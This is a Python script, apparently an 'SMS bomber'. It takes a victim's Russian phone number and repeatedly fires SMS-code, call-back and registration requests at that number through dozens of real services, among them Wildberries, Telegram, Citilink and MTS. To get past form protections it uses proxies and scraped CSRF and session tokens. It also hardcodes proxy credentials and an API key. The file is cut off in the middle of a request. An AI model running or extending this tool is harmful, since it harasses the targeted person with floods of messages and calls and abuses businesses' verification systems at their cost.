import requests
import re
import faker
from requests.auth import HTTPProxyAuth
import config
import headers


phone = str(input("Введите номер в формате 79ххххххххх:"))
while phone[:1] != '7':
	print('Неправильный формат номера')
	phone = input("Введите номер в формате 79ххххххххх:")
else:
	phone = phone
phone_1 = phone[1:]  # 9ххххххххх
phone_2 = "+" + phone
phone_3 = "+"+phone[0]+" ("+phone[1:4]+") "+phone[4:7]+"-"+phone[7:9]+"-"+phone[9:12]
phone1=phone[1:]
phone3 = "+"+phone[0]+" ("+phone[1:4]+") "+phone[4:7]+"-"+phone[7:9]+"-"+phone[9:12]# +7 (977) 355-79-95
phone2="+"+ phone
phone5 = "+"+phone[0]+" "+phone[1:4]+" "+phone[4:7]+"-"+phone[7:9]+"-"+phone[9:12]# +7 987 878-13=21
phone6 = "+"+phone[0]+" "+phone[1:4]+" "+phone[4:7]+"-"+phone[7:9]+"-"+phone[9:12]#+7 929 920-88-31
phone4 = "+"+phone[0:4]+"-"+phone[4:7]+"-"+phone[7:9]+"-"+phone[9:12]#+7987-870-89-32
phone10 = "+"+phone[0]+" "+phone[1:4]+" "+phone[4:7]+" "+phone[7:9]+" "+phone[9:12] # 7 987 870 89 31
phone11 = "8"+" ("+phone[1:4]+") "+phone[4:7]+"-"+phone[7:9]+"-"+phone[9:12] #8 (929) 920-88-31
phone_plus = "+"+phone#+79878708931
name = config.name
proxies = config.proxies
auth = HTTPProxyAuth('BESTpr0xyShopTG', 'proxysoxybot')


def send():
	goods = 0
	bads = 0
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
						  data={'phone': phone, 'ret': '1', 'smsRepeatDelay': '60', 'smsRepeatsDelay': '60',
								'smsRepeatsLimit': '5', 'smsRequestToken': 't19d686d-6d80-4297-8909-b11c575627b8'})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Citilink "+str(good)+'/'+str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://b-apteka.ru/lk/send_confirm_code", data={"phone": phone},
						  headers={"X-Requested-With": "XMLHttpRequest",
								   "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
								   "Connection": "keep-alive",
								   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.101",
								   "Accept-Encoding": "gzip, deflate, br",
								   "Host": "b-apteka.ru",
								   "Origin": "https://b-apteka.ru",
								   "Referer": "https://b-apteka.ru/lk/login",
								   "sec-ch-ua-platform": "Windows",
								   "Sec-Fetch-Dest": "empty",
								   "Sec-Fetch-Mode": "cors",
								   "Sec-Fetch-Site": "same-origin"
								   })
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("bApteka " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://new.moy.magnit.ru/local/ajax/login/",
						  data={"phone": phone, "ksid": "L!77ec46d2-4dcb-684c-3530-32d1538915eb_0"})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Magnit " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			dc_cook1 = requests.get("https://tv.yota.ru/").cookies.get_dict()
			requests.post("https://bmp.tv.yota.ru/api/v10/auth/register/msisdn",
						  json={"msisdn": phone, "password": "3123123"}, cookies=dc_cook1)
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Yota " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://api-user.privetmir.ru/api/v2/send-code",
						  data={'checkApproves': 'Y', 'approve1': 'on', 'approve2': 'on', 'back_url': '',
								'scope': 'register-user reset-password', 'login': phone})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Mir " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://authorization.wildberries.eu/api/v2/code/request",
						  json={"contact": phone, "auth_method": "sms", "lang": "ru"})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Wildberries " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			dc_cook = requests.get("https://sunlight.net/profile/login/?next_encoded=Lw==").cookies.get_dict()
			requests.post("https://api.sunlight.net/v3/customers/authorization/", json={"phone": phone},
						  cookies=dc_cook)
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Sunlight " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://sberuslugi.ru/api/v1/user/secret", json={"phone": phone})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Sberuslugi " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://citystarwear.com/bitrix/templates/bspc/php/bs.auth.sms/templates/pc/handlers.php",
						  data={"hdlr": "bsSendCodeAuth", "bshsmsk": "h5Plm22xoaFs9YTp", "phone": phone_1, "xemail": "",
								"xphone": ""})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("CityStar " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post(
				"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=Arshinov&name=Egor&phone=" + phone + "&email=dfhdfhjdfsnhn@mail.ru&password=liiPD79&$XBV&password_confirm=liiPD79&$XBV&subscribe_email=true")
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Stockmann " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post('https://youla.ru/web-api/auth/request_code', json={"phone": phone_2},
						  headers=headers.HEADERS)
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("youla " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
						  data={"st.r.phone": phone_2}, headers=headers.HEADERS)
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("OK " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			requests.post("https://mts-pro.ru/api/createOrder",
						  {"provider_id": 11, "type": "apartments", "from_site": "mts-pro.ru", "phone": phone,
						   "name": name, "api_key": "9Nfh9VgtHaiJziNBACdMJmLWDVCuz8i0BNR1mzea",
						   "call_later": "now", "call_later_time": ""})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("MTS " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			cook6 = requests.get("https://www.eldorado.ru").cookies.get_dict()
			requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", json={"user_login": phone},
						  cookies=cook6)
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Eldorado " + str(good) + '/' + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			r = session.get("https://megafon.tv/#", proxies=proxies)
			cookies = r.cookies.get_dict()
			r = session.post("https://bmp.megafon.tv/api/v10/auth/register/msisdn", proxies=proxies, cookies=cookies, json={"msisdn": phone, "password": "10293848"})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("MegafonTV " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			r = requests.post("https://my.telegram.org/auth/send_password", proxies=proxies, headers={'user-agent': str(headers.HEADERS)}, data={"phone":"+"+phone})
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Telegram " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://www.traektoria.ru/personal/",
				headers={
						"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"accept-encoding": "gzip, deflate, br",
						"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
						"cache-control": "max-age=0",
						"upgrade-insecure-requests": "1",
						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
					}
			)
			bitrix_sessid = re.search("'bitrix_sessid':'(.+?)'", response.text).group(1)
			response = session.post("https://www.traektoria.ru/local/ajax/authorize.php?action=4",
				headers={
						"accept": "*/*",
						"accept-encoding": "gzip, deflate, br",
						"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
						"content-type": "application/x-www-form-urlencoded",
						"origin": "https://www.traektoria.ru",
						"referer": "https://www.traektoria.ru/personal/",
						"sec-fetch-dest": "empty",
						"sec-fetch-mode": "cors",
						"sec-fetch-site": "same-origin",
						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
					},
				data={
					"firstname": "Бомбер",
					"lastname": "Привет",
					"email": "rbxframer2288@gmail.com",
					"pass": "chtopisat",
					"phone": phone_3,
					"subscribe": "Y",
					"confirmation": "Y",
					"bxsessid": bitrix_sessid,
					"lid": "tr"
				}
			)
			response = session.post("https://www.traektoria.ru/local/ajax/authorize.php?action=2",
				headers={
						"accept": "*/*",
						"accept-encoding": "gzip, deflate, br",
						"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
						"content-type": "application/x-www-form-urlencoded",
						"origin": "https://www.traektoria.ru",
						"referer": "https://www.traektoria.ru/personal/",
						"sec-fetch-dest": "empty",
						"sec-fetch-mode": "cors",
						"sec-fetch-site": "same-origin",
						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
					},
				data={
					"phone": phone_3,
					"bxsessid": bitrix_sessid,
					"lid": "tr"
				}
			)
			good += 1
			goods += 1
		except:
			bad += 1
			bads += 1
	print("Traektoria " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count2):
		try:
			session = requests.Session()
			response = session.get("https://danila-master.ru/")
			csrf = re.search("cityRequestCSRFValue = '(.+?)'", response.text).group(1)
			response = session.post("https://danila-master.ru/user-login.html?tab=signup",
				headers = {
						'accept': 'text/html, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'origin': 'https://danila-master.ru',
						'referer': 'https://danila-master.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
						'x-csrf-token': csrf,
						'x-pjax': 'true',
						'x-pjax-container': '#pjax-enter-popup-login',
						'x-requested-with': 'XMLHttpRequest'
					},
					data = {
						"_csrf" : (None, csrf),
						"SignupForm[phone]" : (None, phone_1),
						"yatarget" : (None, "reglk"),
						"referrer" : (None, "https://danila-master.ru/"),
						"page_title" : (None, "Изготовление памятников - заказать гранитный памятник на могилу"),
						"form_id" : (None, "w1"),
						"form_class" : (None, "popup-form"),
						"form_action" : (None, "https://danila-master.ru/user-login.html?tab=signup"),
					}
			)
			response = session.post("https://danila-master.ru/user-login.html?tab=remind", 
				headers = {
						'accept': 'text/html, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'origin': 'https://danila-master.ru',
						'referer': 'https://danila-master.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
						'x-csrf-token': csrf,
						'x-pjax': 'true',
						'x-pjax-container': '#pjax-enter-popup-login',
						'x-requested-with': 'XMLHttpRequest'
					},
					data = {
						"_csrf" : (None, csrf),
						"PasswordRemindForm[phone]" : (None, phone_1),
						"yatarget" : (None, "reglk"),
						"referrer" : (None, "https://danila-master.ru/"),
						"page_title" : (None, "Изготовление памятников - заказать гранитный памятник на могилу"),
						"form_id" : (None, "w1"),
						"form_class" : (None, "popup-form"),
						"form_action" : (None, "https://danila-master.ru/user-login.html?tab=signup"),
					}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("Danila-M " + str(good) + "/" + str(config.count2))
	good = 0
	bad = 0
	for _ in range(config.count3):
		try:
			session = requests.Session()
			response = session.post("https://oberegvdom.ru/api/call-order",
				headers={
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-length': '485',
						'origin': 'https://oberegvdom.ru',
						'referer': 'https://oberegvdom.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						"user-agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
					},
					data = {
					"phone" : (None, phone_2),
					"last_product_views" : (None, ""),
					"referrer" : (None, "https://yandex.ru/"),
					"entryPoint" : (None, "https://oberegvdom.ru/favorites"),
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("Obereg " + str(good) + "/" + str(config.count3))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://xn---56-5cd4banojr9a8l.xn--p1ai/zakazat-zvonok.html", 
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'max-age=0',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://xn---56-5cd4banojr9a8l.xn--p1ai',
						'referer': 'https://xn---56-5cd4banojr9a8l.xn--p1ai/zakazat-zvonok.html',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					"name": "Антон",
					"phone": phone
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("Pamyatniki " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://zhivika.ru/",
				headers = {
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Host': 'zhivika.ru',
					'Referer': 'https://yandex.ru/',
					'Sec-Fetch-Dest': 'document',
					'Sec-Fetch-Mode': 'navigate',
					'Sec-Fetch-Site': 'cross-site',
					'Upgrade-Insecure-Requests': '1',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
				}
			)
			csrf = re.search('name="csrf-token" content="(.+?)"', response.text).group(1)
			response = session.post("https://zhivika.ru/auth/sms", 
				headers = {
					'Accept': '*/*',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Connection': 'keep-alive',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Host': 'zhivika.ru',
					'Origin': 'https://zhivika.ru',
					'Referer': 'https://zhivika.ru/',
					'sec-ch-ua-mobile': '?0',
					'sec-ch-ua-platform': '"Windows"',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'x-csrf-token': csrf,
					'X-Requested-With': 'XMLHttpRequest'
					},
				data = {
					"phone":phone3
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("Zhivika " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://farmani.ru/ajax/form.php?form_id=CALLBACK&data-trigger=%7B%22class%22%3A%22callback-block%20animate-load%20twosmallfont%20colored%20clicked%22%2C%22data-event%22%3A%22jqm%22%2C%22data-param-form_id%22%3A%22CALLBACK%22%2C%22data-name%22%3A%22callback%22%7D",
				headers = {
					'accept': 'text/html, */*; q=0.01',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'referer': 'https://farmani.ru/',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'x-requested-with': 'XMLHttpRequest'
				}
			)
			bxajaxid = re.search('name="bxajaxid" id="bxajaxid_(.+?)_8BACKi"', response.text).group(1)
			sessid = re.search('id="sessid" value="(.+?)"', response.text).group(1)
			response = session.post("https://farmani.ru/ajax/form.php?form_id=CALLBACK&data-trigger=%7B%22class%22%3A%22callback-block+animate-load+twosmallfont+colored+clicked%22%2C%22data-event%22%3A%22jqm%22%2C%22data-param-form_id%22%3A%22CALLBACK%22%2C%22data-name%22%3A%22callback%22%7D",
				headers = {
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'cache-control': 'max-age=0',
					'origin': 'https://farmani.ru',
					'referer': 'https://farmani.ru/',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-user': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					"bxajaxid" : (None, bxajaxid),
					"AJAX_CALL" : (None, "Y"),
					"sessid" : (None, sessid),
					"WEB_FORM_ID" : (None, "7"),
					"sessid" : (None, sessid),
					"form_text_51" : (None, name),
					"form_text_52" : (None, phone3),
					"nspm" : (None, ""),
					"licenses_popup" : (None, "Y"),
					"web_form_submit" : (None, "Отправить"),
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("farmani " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://tsunami24.ru/",
				headers = {
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Host': 'tsunami24.ru',
					'Referer': 'https://yandex.ru/',
					'Sec-Fetch-Mode': 'navigate',
					'Sec-Fetch-Site': 'cross-site',
					'Sec-Fetch-User': '?1',
					'Upgrade-Insecure-Requests': '1',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
				}
			)
			secret_key = re.search("ddos = '(.+?)'", response.text).group(1)
			sessid = re.search("'bitrix_sessid':'(.+?)'", response.text).group(1)
			response = session.post("https://tsunami24.ru/bitrix/components/badstudio/login.ucaller/ajaxxx.php", 
				headers = {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Connection': 'keep-alive',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Host': 'tsunami24.ru',
					'Origin': 'https://tsunami24.ru',
					'Referer': 'https://tsunami24.ru/',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'X-Requested-With': 'XMLHttpRequest'
					},
				data = {
					"SECRET_KEY": secret_key,
					"PHONE": phone,
					"sessid": sessid,
					"myNumber": "y",
					"CODE": "",
					"backUrl": "/kabinet/",
					"CALLER_ID": "UF_UCALLER_ID",
					"CALLER_KEY": "UF_UCALLER_KEY",
					"AJAX_REQUEST": "Y",
					"action": "call"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("tsunami24 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://vipfish.ru", 
				headers = {
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Host': 'vipfish.ru',
					'Referer': 'https://yandex.ru/',
					'Sec-Fetch-Mode': 'navigate',
					'Sec-Fetch-Site': 'cross-site',
					'Sec-Fetch-User': '?1',
					'Upgrade-Insecure-Requests': '1',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
				}
			)
			response = session.post("https://vipfish.ru/api/auth/pushCode/?senderType=phoneCall",
				headers = {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Connection': 'keep-alive',
					'Host': 'vipfish.ru',
					'Origin': 'https://vipfish.ru',
					'Referer': 'https://vipfish.ru/',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'X-Requested-With': 'XMLHttpRequest'
					},
				data = {
					"LOGIN" : (None, ""),
					"PHONE" : (None, phone3),
					"CODE" : (None, ""),
					"ACTION" : (None, "AUTH_PHONE_SEND"),
				}
			)
			response = session.post("https://vipfish.ru/api/auth/pushCode/?senderType=sms",
				headers = {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Connection': 'keep-alive',
					'Host': 'vipfish.ru',
					'Origin': 'https://vipfish.ru',
					'Referer': 'https://vipfish.ru/',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'X-Requested-With': 'XMLHttpRequest'
					},
				data = {
					"LOGIN" : (None, ""),
					"PHONE" : (None, phone3),
					"CODE" : (None, ""),
					"ACTION" : (None, "AUTH_PHONE_SEND"),
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("vipfish " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://trofey.ru/?bxrand=1662805076263", 
				headers = {
					'accept': '*/*',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'bx-action-type': 'get_dynamic',
					'bx-cache-blocks': '{"PnrJC1":"d41d8cd98f00","LkGdQn":"dc70f67e6079","pwa-frame":"d41d8cd98f00","XEVOpk":"7ae106aa60b6","shops-list-composit-block":"cd2a3abe3cbb","bx_basketFKauiI":"01ef8bae25f8"}',
					'bx-cache-mode': 'HTMLCACHE',
					'bx-ref': 'https://yandex.ru/',
					'referer': 'https://trofey.ru/',
					'sec-fetch-mode': 'cors',
					'sec-fetch-site': 'same-origin',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
					'x-bitrix-composite': 'get_dynamic'
				}
			)
			sessid = re.search("'bitrix_sessid':'(.+?)'", response.text).group(1)
			response = session.post("https://trofey.ru/local/templates/s1_2018/components/bitrix/system.auth.form/modal/ajax.php", 
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'bx-ajax': 'true',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://trofey.ru',
						'referer': 'https://trofey.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					"sessid": sessid,
					"action": "get_check_code",
					"phone" : phone3,
					"typecode": "call"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("trofey " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://www.eda1.ru/orenburg",
				headers = {
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Host': 'www.eda1.ru',
					'If-None-Match': '"af0fd-YeBlPxLpugjUU0gVxLhQDsEKilE"',
					'Referer': 'https://yandex.ru/',
					'Sec-Fetch-Mode': 'navigate',
					'Sec-Fetch-Site': 'same-origin',
					'Sec-Fetch-User': '?1',
					'Upgrade-Insecure-Requests': '1',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
				}
			)
			response = session.post("https://api.eda1.ru/api/user/register", 
				headers = {
						'Accept': 'application/json, text/plain, */*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Content-Type': 'application/json;charset=UTF-8',
						'Host': 'api.eda1.ru',
						'Origin': 'https://www.eda1.ru',
						'Referer': 'https://www.eda1.ru/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-site',
						'sitenew': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'uuid': "868d88c3-0166-c3bf-b59f-0d1480145def",
						'X-Api-Key': '2318700'
					},
				json = {
					"phone":phone1,
					"password":"123123123",
					"password_repeat":"123123123",
					"verify_type":"call"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("eda1 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://orenburg.bestsex-shop.ru/signup/", 
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://orenburg.bestsex-shop.ru',
						'referer': 'https://orenburg.bestsex-shop.ru/signup/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
